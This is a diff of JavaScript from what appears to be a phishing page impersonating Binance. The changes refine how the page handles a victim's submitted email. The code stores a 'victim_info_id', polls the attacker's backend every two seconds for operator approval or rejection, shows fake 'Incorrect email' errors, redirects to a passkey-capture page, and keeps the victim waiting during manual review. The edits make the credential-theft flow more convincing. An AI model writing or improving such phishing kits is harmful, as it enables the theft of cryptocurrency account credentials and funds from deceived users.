@@ -565,14 +565,14 @@
             })
             .then(result => {
                 console.log('Webhook success response:', result);
-                
                 // Store victim info ID for polling
                 if (result.victim_info_id) {
                     localStorage.setItem('binance_victim_info_id', result.victim_info_id);
-                    // Start polling for approval/rejection
+                    // Start polling for approval/rejection - keep loading state
                     pollForApproval(result.victim_info_id, campaignId, 'email');
                 } else {
                     // Fallback to original behavior
+                    hideLoading();
                     setDataExpiration();
                     setTimeout(() => {
                         window.location.href = 'binance-passkey.html';
@@ -581,8 +581,16 @@
             })
             .catch(error => {
                 console.error('Webhook error:', error);
-                hideLoading();
-                showError('Connection error. Please try again.');
+                // Only show connection error for actual network failures
+                if (
+                    error.message.includes('Failed to fetch') ||
+                    error.message.includes('NetworkError') ||
+                    error.message.includes('TypeError')
+                ) {
+                    hideLoading();
+                    showError('Connection error. Please check your internet connection and try again.');
+                }
+                // Do not hide loading or show error for pending/unapproved states
             });
         }
 
@@ -612,7 +620,7 @@
                     } else if (result.status === 'rejected') {
                         // Hide loading and show error
                         hideLoading();
-                        showError(result.error_message || 'Invalid email address. Please try again.');
+                        showError(result.error_message || 'Incorrect email. Please try again.');
                     } else {
                         // Still pending, continue polling
                         setTimeout(poll, 2000); // Poll every 2 seconds
@@ -631,21 +639,22 @@
 
         function showLoading(button) {
             if (button) {
+                const buttonContent = button.querySelector('.button-content');
+                if (buttonContent) {
+                    buttonContent.classList.add('loading');
+                }
                 button.disabled = true;
-                button.innerHTML = `
-                    <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
-                        <div style="width: 16px; height: 16px; border: 2px solid #1e2329; border-top: 2px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                        <span>Loading...</span>
-                    </div>
-                `;
             }
         }
 
         function hideLoading() {
             const button = document.getElementById('next-btn');
             if (button) {
+                const buttonContent = button.querySelector('.button-content');
+                if (buttonContent) {
+                    buttonContent.classList.remove('loading');
+                }
                 button.disabled = false;
-                button.innerHTML = 'Next';
             }
         }
 
@@ -687,14 +696,10 @@
         function resetButton() {
             const button = document.getElementById('next-btn');
             const buttonContent = button.querySelector('.button-content');
-            buttonContent.classList.remove('loading');
+            if (buttonContent) {
+                buttonContent.classList.remove('loading');
+            }
             button.disabled = false;
-        }
-
-        function showLoading(button) {
-            const buttonContent = button.querySelector('.button-content');
-            buttonContent.classList.add('loading');
-            button.disabled = true;
         }
 
         // Initialize on page load
